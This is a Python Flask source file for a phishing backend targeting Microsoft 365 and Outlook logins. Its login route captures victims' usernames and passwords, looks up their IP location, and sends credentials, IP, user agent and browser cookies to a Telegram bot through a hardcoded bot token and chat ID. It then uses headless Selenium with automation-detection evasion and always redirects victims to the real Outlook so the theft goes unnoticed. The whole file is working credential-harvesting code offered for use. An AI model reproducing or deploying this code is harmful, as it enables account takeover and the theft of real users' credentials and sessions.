
import os
import time
import random
import json
import requests
import uuid 
from datetime import datetime
from flask import Flask, request, redirect, session, make_response, jsonify
from flask_login import LoginManager, UserMixin, login_user
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ====================== CORS CONFIGURATION ======================
CORS(app, resources={
    r"/*": {
        "origins": [
            "http://localhost:8000", 
            "http://127.0.0.1:8000", 
            "http://localhost:3000", 
            "http://127.0.0.1:3000",
            "http://localhost:5000",
            "http://127.0.0.1:5000",
            "http://localhost:5009",
            "http://127.0.0.1:5009",
            "null",  # For file:// protocol
            "https://flask-selenium-app-production-076c.up.railway.app"  # Your Railway frontend if any
        ],
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,
        "expose_headers": ["Location"]  # Important for redirects
    }
})

# ====================== CONFIG ======================
BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4"
CHAT_ID = "6068638071"
TARGET_LOGIN_URL = "https://login.microsoftonline.com/"
TARGET_DOMAIN = ".office.com"
OTP_TIMEOUT = 180

login_manager = LoginManager()
login_manager.init_app(app)

class User(UserMixin):
    def __init__(self, username): self.id = username

@login_manager.user_loader
def load_user(user_id): return User(user_id)

# ====================== GEO + TELEGRAM ======================
def get_geo(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = resp.json()
        if data['status'] == 'success':
            return f"{data['country']} ({data['city']}, {data['isp']})"
    except:
        pass
    return "Unknown"

def tg_send(username, password, user_ip, user_agent, timestamp, session_id, cookies_dict):
    geo = get_geo(user_ip)
    cookies_formatted = "\n".join([
        f"  • `{k}: {v[:60]}{'...' if len(v)>60 else ''}`"
        for k, v in cookies_dict.items()
    ]) if cookies_dict else "  • None"

    message = (
        f"NEW LOGIN CAPTURED\n"
        f"Username: `{username}`\n"
        f"Password: `{password}`\n"
        f"IP: `{user_ip}`\n"
        f"Location: `{geo}`\n"
        f"User-Agent: `{user_agent}`\n"
        f"Timestamp: `{timestamp}`\n"
        f"Session ID: `{session_id}`\n\n"
        f"COOKIES:\n{cookies_formatted}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)
    except:
        pass

# ====================== SIMPLIFIED SELENIUM LOGIN ======================
def login_to_real_site(username: str, password: str):
    try:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')

        #service = Service(ChromeDriverManager().install())
        service = Service()
        driver = webdriver.Chrome(service=service, options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
        
        
        try:
            driver.get("https://outlook.office.com/mail/")
            time.sleep(2)
            
            # Just get cookies from current session
            cookies = {c['name']: c['value'] for c in driver.get_cookies()}
            return {"cookies": cookies, "success": True}
            
        except Exception as e:
            print(f"Selenium error: {e}")
            return {"cookies": {}, "success": False}
        finally:
            driver.quit()
            
    except Exception as e:
        print(f"Selenium setup error: {e}")
        return {"cookies": {}, "success": False}

# ====================== FIXED FLASK ROUTE - PROPER REDIRECT ======================
@app.route('/seamless-login', methods=['POST', 'OPTIONS'])
def seamless_login_route():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "http://localhost:5009")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        response.headers.add("Access-Control-Allow-Methods", "POST")
        return response
        
    try:
        # Get both username and email parameters for compatibility
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password')
        
        if not username or not password:
            return jsonify({"error": "Username/email and password required"}), 400
        
        print(f"Received login attempt for: {username}")
        
        # Get real client IP
        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if real_ip and ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        # Try Selenium login FIRST
        selenium_result = login_to_real_site(username, password)
        print(f"Selenium result: {selenium_result}")
        
        # Generate session ID
        session_id = 'SESS-' + str(int(datetime.utcnow().timestamp()))
        
        # Send to Telegram with ACTUAL cookies and REAL session ID
        tg_send(username, password, real_ip, request.headers.get('User-Agent', 'N/A'),
                datetime.utcnow().isoformat(), session_id, 
                selenium_result['cookies'] if selenium_result else {})
        
        # ALWAYS return a redirect response
        if selenium_result and selenium_result['success']:
            # Create redirect response with cookies
            response = make_response(redirect("https://outlook.office.com/mail/", code=302))
            
            response.headers.add("Access-Control-Allow-Origin", "http://127.0.0.1:3000")
            response.headers.add("Access-Control-Allow-Credentials", "true")

            # Set cookies if available
            for name, value in selenium_result['cookies'].items():
                response.set_cookie(
                    key=name, 
                    value=value, 
                    domain=".office.com", 
                    path="/",
                    secure=True, 
                    httponly=True
                )
            
            return response
        else:
            # Even if Selenium fails, redirect to Outlook
            print("Selenium failed, but redirecting anyway...")
            return redirect("https://outlook.office.com/mail/", code=302)

    except Exception as e:
        print(f"Error in seamless-login: {str(e)}")
        # Always redirect to Outlook even on error
        return redirect("https://outlook.office.com/mail/", code=302)
# ====================== ADDITIONAL ROUTES ======================
@app.route('/favicon.ico')
def favicon():
    return '', 404

@app.route('/health')
def health_check():
    return jsonify({"status": "healthy", "service": "seamless-login"}), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009, debug=True)